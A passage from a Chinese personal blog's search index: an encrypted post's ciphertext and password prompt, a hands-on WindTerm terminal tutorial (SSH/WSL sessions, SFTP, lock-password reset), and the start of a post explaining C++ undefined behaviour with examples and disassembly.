f30ef31e734229e1051f1a0ab5860d095f2e4c65039d09303e0a8066aa562027f8d3bfcb9c1c448aafcd3b2078dae016239b68f4b28ca4d2e1b7befce7330c2b422a3f2c77a604953f7520f1f9103b2aa962552c3fecb6357d6779837a852503fd1fe9969ce0580b090449f85cb8cca9668e27c3cd007427fd3fd655d1a60eb9630e684593ed515bef40129a1117bb361e2fe4b2a248a7a388d10004dfe0d8cf9f492e405956ee51d65cfd8fd12953ca755da6604704ec280dabd61231498a668a52d62bd66961d9ee8a001edd173b82167948747f126474b9f665cd1252ed8e6c15fee06f0cdd94cb383c0c6d7843d52aa1188aa21f233360e26a8ed186ad2bed08518dbe04d982469298a2d1e9177f174982928529f72acc23f77860948c407511499488cc7f41bf961941c8ff2469d7c796d65f73b30abb52dfdb490af188b9192516e56a64c8cb1e2c5cec82a8174eba6d334d377b3027f24c16e2c206bd87c91c25737fe6b34849ddaac14d11699a7bb8b45a43883faed5d8d1e55aed9c22e58e939ea2ab28e8841e56e617a5118dfa4edb9f1372dca58940e7488b3d19625556ae978b46a4cc888d75010cf2264af3bba464c47463e922335d082105f4bb467fc87ff877bbf3d986bdfdb505276a2404fcbe735d881995c34938ce7543e3ed8f0e25dae250fb8613c0d82988f00502b6c540bc58f4e369356d7089c702fb7d9e149ab77498f271d0aacaa3b2dfc3fcdbd11a4dd83669c13a6ce7fd1a9203e46c122a8e61d8170cf344ca14aa1d029a707397c0e1e8ba4eb23e7a231e614e309533637ee4e7c18fc64633f3f03c84b2ef37edbb73f85a4e2fe83aa2561c7c9bb4be85e0c6a85255f430e7f329c3047d114483531a171f39fadf62e79286d04dc280ee410ed68c05036cc4d86f4c7c80da6de34827af8e776527752223df4263860a41f1db246bd97d875e3f3611a92cc3a8906d43aba58a239b94bda2cce3f1985614f1888a4087b04fde76b2f4d881a812089d1d4aa57c487e747f99b7735713b0d2348afe37e2dc0f3c5e85b222e746b6f56b82bb6de1fed6eca123e46447106d8486a305cd3fc1366d38f723569734e80f3ffe666bd9cf45375d60f6c1c40776f55201297dd7d8b1cf36c5ab6452b272fb60eb21a37a673d3b0b9ffbab84768cf95a84907b49af4782a404ce4709f4673e319a0df59c487d4405aed97dc283a3e61c6ea01c2bbba3ef0333eed7e8aa80ae1fb57d08534ec2092133ab850ec3dbbbd49e7a2062e6472c45f773148f65aec08c282b9a583b3229bfa3be1aa9a71972ba59d0f500939fe8273922f42be7a9e9be6183b07a96a04041d090b84bc7b3f5a1004b5793cd258e7653eaa5acb913c544b01e58643d6ecfd269c4eb31ce2878e2d2eb6301f35a3d9737e68e56369d7f1ef57d97719ec4998c361615ebea0208b03a10d61e79f480a9005237108d261e7ab9ecc49df260e739bd2dfc27319a2685a065b7c8dd0b00bf52f8445625700510ac13859b37e9300117c366742363b9cb84f5b0f2f90665fa9a19040ca779f47175ffdae61e444f62f3fcb55896b4b509961885ce360d8ff9b756a6b14b34e1d7b7681654a14776fedf3831c0bb642b5653688f344db25a051f234c4509c8e5d6d4e2592d9e3909690f95f83374106daaf57e0a94735232c48163d88aa2bd1145f681dd6f069aca4828fe2ceb0f942b0fb9f50ee3be028d2f095eb6a6bea431a43d1e95c543216b8a33c96d3c674280dd6f73449b4638b3c3745d1662c1f4e3131af62b1f538e1aa9bbe698956c33a4a54a85d55b3e00319a07c04c6975cd66be01014bf6dbd3e44d567f987530d0dc1c602e400865df0c0d91eb21281c786f1305941eae856b2076bd279f1fcefc758106694d6ea1edfdc6463e1e1bf425ff2751355ab0502934bcb05c9cf4ada832f092f2735415dd52fe57430607ca3274b09f56c1f21dae90b098d778ccda216d59b4c6ea28e0d39293f1b99274e19121915b29c571468970db4f36aaac30a1d271c3587da3fed5b2e971020f1f6651befb7511b6d2838eb6058ac73efd7dc407ed8254241898b27fae43939e9048624209ad3d1e45895aa1cff79f8fda429f9cbe61294724e05f3c259d8126fecb9d358c84786df0ad635cdc68853917a5b68a59e166423e41280e8c535abdcad35981e14f754bd441b448dae7b150746c28423c5e43db295ffdffc82e769f293ceba6c5de713aa81975c7328af199e88791411b8766e8f5107d17681d8a46ac7c2e283d73b174e2b2f76d5afecf177ed8494f23272fa07b3015bf02ebbbfdf2226a14772bbd0e2fff2fc49a3a17a67ed0195a0ecd4f1841c6e71dde8f1617477568dff02b9936d40c3ad4e7739ce3723f3a72d1ebfc7db5ab91e9a9fb731f839ec17a50ede0bb8c17178e607b885d67564a242f0c140916925835db951b3e4b4ad47caa3b545b3385d4ffc9d8fc3081ed35e319cb6310dc3f9a0e6ba70d46d27759d28bc5810c6486fd7f3eebcdd5a6e4e737d8b26fac5d6f5fdba27348a86b672238528a072bbec5bfb8488a3f8cf78ca5bb9082fcb4e88999b7a0b4c0a69ed17d788cc108ac7e78f0f47aaf589476db8b79b8ed2bf8ef66bbe6c8fbe7d65fce343d96a9dc38203560d339ff85845df85680f88db75faa77ccfb947bb9de52e5a4be6aea0e6c2cdb71c8a3a2fcb310c259d6801afb4a445dbae426a800ec86d1fdc0f672f6a2e630675da08ee8f4187b1f20f5aa33fe5f3b3187982f95b4e5909c4a4b4c52860afbb31ef3008cc438d61a98d4ad87d57680ebba08c1e22acc1807f82359eb9ef75e4165f46114b3efebc0a329ec9228481960b004edcd6525ca752376965523db2c1c2fc4687d51b2700ccd605c29e7c6c553e95949248f210666a7184d41c9cc2ebccdcb9e36fd8a5812b5fa49bb1d8238dfb65cdbfbedbb409237b208dbc286d2cdbb02fa4e5ba54faa46ceedf014a8b164f9def3ee2a6845bd1cdef5960e5946ea07cdaef0e7f329193b85c0e3aa17ed17992b34a6b3e6790b9568945b016843a6d024b0a25a51d92496c7bc9c2e2cc1f61b9d603fdba5386ba45abeb2cdffc42eefb35f5d1400e54d668875fb5fddbedc8b2aba81e12b2e8f340aa95c70e550b59fbfba76e82c0b3570fde5484c5f0b2caf664a49f1df23859f606baf221cf6839c69b1388ff4479325e959f488f9dc5367875688f26d29bde9cf0116bd92439e87abe1da409618bc7272a4c69c444694ce4d5018e9209c58386d00741eb358057409dc5b7d8395a81ccd3c994056816908811dded8052bf885a3a847b72a78a52af3941a744329c6ef97bbb9413be124c05a12c8a30d72cf5fa0d08dda857ebca3c5e04e594e1a5fe905dc2d6e920ce4857ef7db4ac09f224694eb07211dc9c6da0c0a78165443cd5f7e6044c251a1e592835137090068b3853a7672cc35fbc9288b7592df7142ff04e5ceb222acb527a5dba85e47cf3bac19904958b14c78ef7a3f60510c4d910a6594f9ea5185a75d41ccff55f3eb04ddc41e3b75e8f66f064464361835089e4269c8ac2a80a2883acc2d2c89cc21fe1c54be9d8cf1a48c1b0ff3b955006077a131893de88482ef92b3d3e935f9420883b52e793f5bc361eac9dcc290d9f979372000a80a110178e6b4641d9133b703a8d84b9f124a18dba8beae18d93f4a7a232d6a536b5df759a7ea3956e6b125d85d6d539a584886ff7f3c30243ffb4935918d140fcabb505cab4adb030ed93822ae1afa78d941d7d4ec7ae4b763f7c331e681bd06141a1ccfb475d02bc962904a033ed1eec7b8b747baadaf4007cb7f30c579c7f5a85e60a1a6f67d402d3c09dc5da26308f5229bb9fda63376e3bc8154a64f58e7af0dcda0761511f5f6d1deea3255e1153029088b4cad3ac674d06b51bb72e9e4d5084ab846a2246cf6b30a578dd669244c1d8e07a773759eec391816dfe1e3693494ee265d73ea14d43edbef9aa3e3db6754326fc14a4ced43ec218c6f204935034fc098423542c9cd82f07be10f2d8cfa130ae2dc06c5559c74d2a84a72aa5dd80826741b1b0a98acf12f534d42c16e6415243a3610d873ecbed0d5a2e468acf5c058c69636f59ea9a175b53a647d5afc9deb02324c6c35ec6811364e491e6ec3d54dc65f6027e6b49b24c94f470865e5cca9afbadaf5ab757ab1b316b5bd15b80957a9d7f649c45deff5d29ecaa5f06611ff835ca5215c260260bc4a65967ce6eab950f76e1da5d30432fd29f741ceb6ce3ded73943727a812587b31ea36d4048469e6ca2678cc0ccfa2aeddc7ae625cdd59318e882eda7cf830f33429b1496389334f6c2735d90276acdf9824fb8c5d41d40f894650efc7ea7bb78383308a96575b0aa7e0162bec753c95945d5cd08b56d5d0b7557a0405baf1f6dd6576fddba9a85ffa37dea8c3dff28f52e3b13e47d3496635561ee304b063c474922eda581098db953b408a1d249ad23c953d3347b628d5510ad38e45264203c1991934966994e04c1835a2f26107b524ded143007b0529a639c6e73d673db45c8038f387617a721a09e72c3cbefe1a88478c5cbc1bbefbb96e3074c8c14de085c6c4deaee512e63536e697801110067fc79fe25a0ac9e185f0c36d798d1ecf291cd28d119b399cccc655d60b802da54ccf5523db27b27a59af60fb0410fcd9c5e8a210149821c4333a959e5831618b0a7d17ee7ba4d2b3e268af829f80a9eec29a4e136fdfac32059d342f072d0e9da8375312c543d2c4873d8d22a590859d5f643aef4b8af56f7775bc8b48765f2159345972c190d0966307aaf728c37797cd8c91655493a04856ab2ae8b986c2c724e6d7fabce5f63336ab2188b1f4d792c6d87f9453c3f94a8d4cb1d6eb3a7772c19b3edc99c0b1712d4691625c16c8c906dfa5ada9300b97e8a7a6a4cde559ea71cea7c8c8ad3e374f3ccc998551cb24c69826d7d1865f3633306c55839a3d3a5397e57da77e457f3e404b2d3c39f0531a5e8238fc4e8814c182a614ca6df63e3bc885eb051d5afa230490f2e8b86fd7512bd74f3949face3ecd8a3d9ae8335377116a1eedf20e6cc19cfca798815c841ab2ca6d29cc7f43b141f6cdd11b3782d77506a0d2c69455d71865dbfb4603ac4798a2e75ad79feed9127505af1566bffebe525b672d702c49d23b0b464b29661b2eb5ea6949749b2ecbb2b41d98079186480c9d41d8a312d82915e716feb4e503859f003bcfc758f1e75d11fc8b054d1ca15308c955a70e1eb760099f15902a2a5d8771a81811b43a3b51ae0aec5ca15e6944b2fd675c933b4b43d9aba6a8d06ba12390dab24c2762be822ba63c2a492f0b1467bc9d9923f003075cc110fa7a9b9ac48dfe318c84430bc56ae7c94d328576e208e88b54af384459bb51c7c398532396e0bbe4a991ad09e86db9bdce5de3045c2f133f7bab083fb3e6d297f9f4c7e1958e7320b0c1069358dd5d87eb4a9f8a93472c137d8c5a14e7414716379dc2c4aec51b6e5eca5c54705f97919a7fc8980266c597f80bc4b507384eff71e12cbb6310e8d611f151ec548689769a40c4c522a389f89ec8f07775249f37beabc3d1a1a5e08a2caf418b6658097354e229e3d83e1e5defab9ec4a4ba5abc0d10a37371171bafa261a13523baeec30d1d86021e0976de7427d5dc6268a8d0aa4c04cf7629b16389c8b77851466384bce96b33508c29a2dac89b07128d2be6a0615c22005cff396a91f36505efb1f314629aa7e8c771568b163cfb13153864749607db317877d5f71fc68ebb6432a882d3b9745833367db14290c5ef5bbae8deb163cce5a68c995b2b4db6dc596f908266bc344d433c89fc434750d7bb9cdb8fa80cf23752970e5e6526f3843817bd4b8e9f2e83a5c231e6958be6630f59d8ff1bae5a5abc9693b2f689a049153d5edbf4f09e57547a0a764b955e4195cf3ff000c9bca4d985e80d2334a783f3cdffcf26dbab1d7edabbf755e46d57a10dd7a089c88d8df981a27d0643108fb91dd702a0900aba83a8a1a4275b9e0817aff13ca9136a1cb2df1cdb2052230ac9b60fdaa213b3295a21971081661157e6f549cd8d270bc70f2ef9a21da033343ea1765ae590961b332cd82bad66d5f51a6c746e997375d3535d67a9e79410232b0e0a269b834536c087fee014feafa276366798d1282a114c370644bd5b1facb7985155dbcbfeac03c82498731d3fdfff2d620f1bea232de208ed58568df67a428142ca71b9c12c1c2e60ba832e257b2dea81e6c609f597000c598eac3b271021a8e308e2c4e8a80ee978c218849dc198b23cbafe39ea52cbeff529bb4f3e09b7e642e5bf9b840e59006ff042e17750c0016ac94b320d5564835a448f8a881cc694e21786b97211292b230cc4e43503a80c9a6c4b39f722b8c10cfae2989a1fcabeec6d2dd538ea1fd4a9b93ca9e623d36ca78caaa25315dab9383f6b40672bd6baabaa0e5473d56f8a6365730bc00e0e0d234d44dbe565a8e5b555deb3fadfea69a3ec179830340271919a0901027bea8b52dbb4c52c95244ccd5e2fa60bfd9d2eb274599e6765a414e1dbd814b845ef5c4da167952c74dd1fd733da1c163bc8d55f247958ef8c9cab89f15da2399653f0607354460505dc6f542645c0f5c0d3fb1b54ab37ef1f9d010e76bf7db7017ad7d0a79134fc18c1426882694aa001e478d025599896f625442ea187551e46eec5fafdf913135effb22c15879b54d83d93ab44d8bcf8c82652362cb09f4e3493f24469a7f0471a4db2d9091c4e9a30b1a4e7f56a4857ffdfcacf1f6f1f99443fef658c55883b2b14951494992129d51ab83cd4771109c6da72d01de36cab197879b5fafdec45d6a79303d194173b19d8b3e837588b365ce343874b7d3addac6b49aa038fcdead70550f1fac12a34372226b27d205af7fafcb6c7e5eaa144019033dde1be819691aa383ab7b8b033eade2e8d9dda5a1aaceb9b4e19c4b77e3de32a9c97a0721999ebe7926cb64b571bd6f3fe375c12634741d75d92567807676da44c50c4783d0d9d51b78156aeffeebfce33418893058d075ab32e36770714ab9e56a2dd0869dcb4bb10bcc57976911b1d4d595580bb6ab6549181032e0913b3af085c32abafd71d794d6cedd3085680b109dee38b2fac263b6ceff4944a2a9c4c75d01bfecdb8c09a87ee3d75daee87cab7d0ef6bde1559e3c549d6f539d70288c8d4e81005b76139d7520fde167c4b4414bbcd59a29dd35e47764dde6030b2b4e37cc9d259c1211b1fd8801fd0b50e2a52ca885714bef21508765b49bb7a5c3233b6057041d41e9a06835a3f0f857ff500a0b11677109b831a4993ce898a63b08e51ab532a83483e0ad59b483f53ddc291409e6896f957ad63dea1e2c5e7015052dacfe792b5b879f439a47c82568ed9fea42bd1504d00eb7ce907a7d0193fa21e49d65a23543805d43a9faa65cc78ba207f9e46c29d2878ae1bce0373555d8be26b867c8a58c7ee8683bfd67d7a7727e20bd9498902a3b30faa6d0cc1c4c937b3b7258fd5d7725c23389ae8c5bfde04c5bc6d54673f14746d8901886aa545c5911013738089e93dcc7bbbc067f24794dd7f85e3b36c430b7a25aff6d8557cacee891490b33fde0d8270479f153f0097bdfa1980b0ea0fcd242ccb762ce8756748eb3a9046c2ea2bd54375800bcd4c3d7fe668c7a22eb7eb2390ddbd1296028be0c7a81f0392a8b552c09419215ccae19714c7b952f7750e882aedcdfd8472097787abcfa0b669566db60558549d48bc400e71e07d2508a6e30a5ae90319f579cfe2a838f4201debac5564c54597a709525bd54a14e6ac6864f9bf208ef424429173826bc5e5851587a37a7e0f3b82a6b5a97697d196d5fc738cda724a87578031fca0435fa24a330da1f3f1703c733cdebc567f992f92f73ea7ebed1a7950c3773d6aea86699a02a91aaedde072e49a8840f14f37bc08abe520c34ac9acce840f8460c0173b0e8ef165468d04392b38264540f62a6e8d843c7f5269a444b39488941a9d4389b963e8cf17cf05c921535bf30c12be34d0200d7064018f7801e24d2fa5a84c9eb47974cd1050fad67fa6ab8016047b4c0c909acd1e675302f55fa65cd84fa6cde6e453eb75437b5f841b5434cc91ef2bafad9bd41dfd38e45e294bcf37559465d3029a67f2a4961a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
            <tag> Windows </tag>
            
            <tag> RemoteControl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】WindTerm</title>
      <link href="/2022/08/28/WindTerm/"/>
      <url>/2022/08/28/WindTerm/</url>
      
        <content type="html"><![CDATA[<p>新·终端开源神器</p><ul><li><a href="https://github.com/kingToolbox/WindTerm">WindTerm</a></li><li><a href="https://github.com/kingToolbox/WindTerm/releases">WindTerm&#x2F;releases</a></li></ul><p>下载解压出来就可以使用了。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最早的时候连接多个虚拟机或者交换机，用的都是<a href="https://baike.baidu.com/item/Xshell/5659054?fr=aladdin">xshell</a>之类的。<br>这类软件所使用的连接协议均为SSH&#x2F;Telnet，当然还有com口的连接，那些比较老了有点。<br>除此之外还有文件传输协议FTP，貌似也有封装过的FTP。</p><p>软件嘛，ui是吸引人的第一步，功能是留住用户的第二步，开源是留住全人类的一大步。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-ui展示"><a href="#1-ui展示" class="headerlink" title="1. ui展示"></a>1. ui展示</h2><p>直接顺走GitHub的图。</p><p>Main Window (zsh):</p><img src="/2022/08/28/WindTerm/WindTerm.png" class=""><p>Split views:</p><img src="/2022/08/28/WindTerm/SplitView.png" class=""><p>DigeWhite Theme:</p><img src="/2022/08/28/WindTerm/WindTerm_DigeWhite_Theme.png" class=""><blockquote><p>支持zsh，这玩意怎么说呢，配合ohmyzsh，然后主题powerlevelp10k好像是，可以把这个sh整的花里胡哨的哈哈</p></blockquote><hr><h2 id="2-性能"><a href="#2-性能" class="headerlink" title="2. 性能"></a>2. 性能</h2><img src="/2022/08/28/WindTerm/000.png" class=""><p>作者很直白的举例了各个软件直接的差距</p><img src="/2022/08/28/WindTerm/001.png" class=""><p>而且正式版的软件体积大小只有三十多兆，更是支持跨平台。</p><hr><h2 id="3-上手"><a href="#3-上手" class="headerlink" title="3. 上手"></a>3. 上手</h2><img src="/2022/08/28/WindTerm/002.png" class=""><p>刚打开是的时候会选择缓存的目录，直接放到软件目录也行，放到用户目录也ok。</p><p>点击此处可以新建会话也可以在菜单栏里面选择会话，然后新建会话。</p><img src="/2022/08/28/WindTerm/003.png" class=""><p>打开新建会话之后便是这个窗口，这个窗口不能缩放有点尴尬。</p><img src="/2022/08/28/WindTerm/004.png" class=""><p>在主机处输入ip地址，可以在前面加用户，<code>username@xxx.xxx.xxx.xxx</code>，这个反正到时候连接也会有提示用户名。<br>端口固定<br>标签&#x2F;分组可加可不加<br>终端看了下应该是这个颜色比较多吧<br>字符集肯定都是以utf-8为主，Linux而言。<br>描述这个也没法拖动大小比较不爽。</p><p>如果你想让界面看着更简洁一些，可以把不需要的区域关闭</p><img src="/2022/08/28/WindTerm/005.png" class=""><p>直接点击<code>x</code>就行。</p><hr><h3 id="3-1-全局配置"><a href="#3-1-全局配置" class="headerlink" title="3.1 全局配置"></a>3.1 全局配置</h3><blockquote><p>菜单栏选择会话——选择首选项&#x2F;设置</p></blockquote><img src="/2022/08/28/WindTerm/006.png" class=""><p>比如这个启动里，我们不需要打开会话，就选择第一个无会话。也可以指定。</p><p>或者修改此处右击功能，如果不习惯快捷键拷贝黏贴这也是一个解决办法。</p><img src="/2022/08/28/WindTerm/007.png" class=""><p>还有就是这个悬停激活，感觉大部分人用不到吧，可以关了。</p><img src="/2022/08/28/WindTerm/008.png" class=""><p>文件管理器显示隐藏文件还是有点用的</p><blockquote><p>隐藏文件就是以.开头的文件或目录，这点学过linux的比较清楚</p></blockquote><img src="/2022/08/28/WindTerm/010.png" class=""><hr><h3 id="3-2-连接wsl"><a href="#3-2-连接wsl" class="headerlink" title="3.2 连接wsl"></a>3.2 连接wsl</h3><img src="/2022/08/28/WindTerm/009.png" class=""><p>连接本机的wsl，在右边的shell session中可以直接选择。<br>不需要额外配置，毕竟是本机的东西了。</p><p>默认Ubuntu用的是bash。一些常规的快捷方式它都能显示出来还是很友好的。</p><img src="/2022/08/28/WindTerm/011.png" class=""><blockquote><p>当然对于本机上cmd&#x2F;powershell&#x2F;wsl 不想出现很多个窗口也是有办法的。<br>微软商店有一个软件叫windows terminal，中文叫终端好像也挺好用的。<br>当然这是针对本地的。</p></blockquote><hr><h3 id="3-3-连接虚拟机"><a href="#3-3-连接虚拟机" class="headerlink" title="3.3 连接虚拟机"></a>3.3 连接虚拟机</h3><p>打开虚拟机，打开已经安装好的linux或者其它系统。</p><blockquote><p>ip a 看下地址先</p></blockquote><p>然后确保ssh服务安装并启动</p><blockquote><p>systemctl status ssh &#x2F;&#x2F;如果是不是running的状态就请<br>systemctl start ssh &#x2F;&#x2F;启动服务</p></blockquote><p>如果没安装<br>Debian系列的：<code>sudo apt install ssh</code><br>RedHat系列的：<code>sudo yum install ssh</code><br>可能个别的ssh有区别应该会有提示的。</p><p>新建会话</p><img src="/2022/08/28/WindTerm/012.png" class=""><p>主机那不加用户名到时候连接反正还要输，加了也就是不用改了偷个懒。</p><img src="/2022/08/28/WindTerm/013.png" class=""><p>此处输入用户密码，kali虚拟机默认都是<code>kali kali</code></p><p>成功连接</p><img src="/2022/08/28/WindTerm/014.png" class=""><p>可以看到kali自带的zsh被很好的渲染出来了。那么后期要改这玩意也没啥事。</p><hr><h3 id="3-4-传输文件"><a href="#3-4-传输文件" class="headerlink" title="3.4 传输文件"></a>3.4 传输文件</h3><p>xshell我记得是分离的。<br>windterm是集成的很好用。</p><blockquote><p>基于SFTP</p></blockquote><p>你可以选择上传</p><img src="/2022/08/28/WindTerm/015.png" class=""><p>也可以直接拖动文件到这里她会有提示的。<br>并且传输完成后还有进度显示。</p><img src="/2022/08/28/WindTerm/016.png" class=""><p>如果想直接在ssh会话窗口上传，好像需要安装别的工具，听说过一个<code>lrzsz</code><br>但我目前没这个需求。<br>也是根据linux分类<br>ReadHat就是<code>yum install lrzsz</code><br>Debian就是<code>apt install lrzsz</code><br>权限不够就加<code>sudo</code>提权。</p><hr><h2 id="4-锁屏密码"><a href="#4-锁屏密码" class="headerlink" title="4.锁屏密码"></a>4.锁屏密码</h2><p>默认30分钟没有操作，软件自身会锁屏。</p><blockquote><p>默认是空密码不用担心，直接回车就解锁了。</p></blockquote><p>如果你提示密码错误。<br>请先找到配置文件<code>.wind</code>，这个我们第一次打开软件的时候就说过。<br><code>.wind\profiles\default.v10</code>下有个user.config，如果里面有<code>application.fingerprint</code>和<code>application.masterPassword</code>干掉就行。</p><p>然后<code> .wind/profiles/default.v10/terminal/user.sessions</code>，里面如果有session.autoLogin就把著密码设为空的字符串。<br>之后选择更改著密码，旧密码是空的，新密码自己看着来。</p><hr><h2 id="5-主题"><a href="#5-主题" class="headerlink" title="5.主题"></a>5.主题</h2><p>软件的自带主题对我来说足够了，我后面只需要动动zsh就行</p><img src="/2022/08/28/WindTerm/017.png" class=""><hr><h2 id="6-x11"><a href="#6-x11" class="headerlink" title="6.x11"></a>6.x11</h2><p>这个怎么说呢，wsl2我知道是可以运行图形化的。<br>WinTerm据说集成了VcXsrv，但是我目前没有什么可以尝试。<br>对这方面有需求的可以自行百度，后期用到了我可能会加上。</p><hr><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>还有很多值得自己探索一番。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UB未定义行为</title>
      <link href="/2022/08/24/undefinedbehaviour/"/>
      <url>/2022/08/24/undefinedbehaviour/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>额。。惭愧，今天在群里听到UB，我还以为是啥咋没听过。</p><p>UB:<code>undefined behaviour</code>，简称：<code>未定义行为</code>。<br>不过u1s1啊。undefined，这个经常见，所以一听就知道，组合词确实是我孤陋寡闻了。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/08/24/undefinedbehaviour/000.png" class=""><p>这是当时群里的题</p><p>不过借此，也可以适当进一步了解未定义行为。</p><p>首先，未定义行为怎么来的？也不合适，应该是先考虑定义。<br>所谓的语言标准，自然有自己的标准委员会提出，也就是c++ iso的说法，即c++11、c++14巴拉巴拉的，除去这一层，不同的编译器也可能自己做了优化，又多了一层定义。那么这层定义就比较搞了，因为相同的代码在不同编译器下就很有可能出问题。所以尽量不要再这上面钻牛角尖。</p><blockquote><p>未定义行为：可以说是语言标准没有规定，编译器自行决定的行为，而且在不同的编译器上有时会有不同的结果。</p></blockquote><hr><h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><p>就是很无聊的++问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">i = i++;</span><br></pre></td></tr></table></figure><p>在我们的印象里，后置递增，先操作后自增。即<code>i=i; i++</code><br>但是还有一种恶心的情况，<code>i++; i=i </code></p><p>当然这里能想到后者就完犊子了，肯定是先赋值后递增，所以i&#x3D;1</p><p>然后就来了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">i = i+++j;</span><br></pre></td></tr></table></figure><p>问？正常情况下你觉得是<code>i=(i++)+j</code>还是<code>i=i+(++j)</code></p><p>让我们瞅瞅vs的反汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00007FF72C6A1E22  mov         eax,dword ptr [j]  </span><br><span class="line">00007FF72C6A1E25  mov         ecx,dword ptr [i]  </span><br><span class="line">00007FF72C6A1E28  add         ecx,eax  </span><br><span class="line">00007FF72C6A1E2A  mov         eax,ecx  </span><br><span class="line">00007FF72C6A1E2C  mov         dword ptr [i],eax  </span><br><span class="line">00007FF72C6A1E2F  mov         eax,dword ptr [i]  </span><br><span class="line">00007FF72C6A1E32  inc         eax  </span><br><span class="line">00007FF72C6A1E34  mov         dword ptr [i],eax </span><br></pre></td></tr></table></figure><blockquote><p>汇编指令inc 是让操作数+1</p></blockquote><p>首先把j的值传给eax，把i的值传给ecx，然后ecx+eax，再把ecx的值传给eax，也就是i+j，<br>然后把eax的值传回给变量i，变量i的值又传给eax，然后eax 完成inc，也就是自增，最后再把eax的值传回变量i。也就是后面的自增。</p><p>显然在vs中，<code>i = (i++)+j</code>。</p><p><strong>tips：这里其实也有个小坑，就是运算符优先级，他会优先处理掉高等级的，所以在有的时候你不要去让编译器考虑优先级，你应该加括号自己先预演好优先级</strong></p><p>还有一种吊炸天的问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">i = i+++++j;</span><br><span class="line">std::cout &lt;&lt; i;</span><br></pre></td></tr></table></figure><p>你说是<code>i+ (++(++j))</code>还是<code>i++ + ++j</code><br>很无厘头啊，虽然现在的vs会要求你有格式控制，一整串他是不认账的。</p><p>但是你要放在试卷上，就是铁nt行为。</p><p>像已知的，gcc、msvc、clang他们的支持就有区别了。<br>这种无厘头的说实在没有必要太纠结，开发这么写要给打死。<br>也别只拿vs的反汇编说话，虽然能给出一个答案，但是不管从什么角度而言这种题目都很反人类。</p><hr><h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><p>标准定义，常量是在初始化也可以说定义后是不能被修改的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> *b = (<span class="type">int</span>*)&amp;a;</span><br><span class="line">*b = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>那么a的值？</p><p>在iso硬性规定常量不能被修改，因为常量被当成右值了。<br>当我们强制转换成整型指针然后取他的地址。就变相的控制了</p><p>很显然这也是未定义行为，不过有些时候还真有这么用的，但是不太好。毕竟万一常量释放了，这个指针又不知道搞哪去了。</p><hr><h2 id="例三"><a href="#例三" class="headerlink" title="例三"></a>例三</h2><p>就是重复释放</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure><p>编译器不会报错，但不能保证会不会出现别的结果。</p><hr><h2 id="总而言之"><a href="#总而言之" class="headerlink" 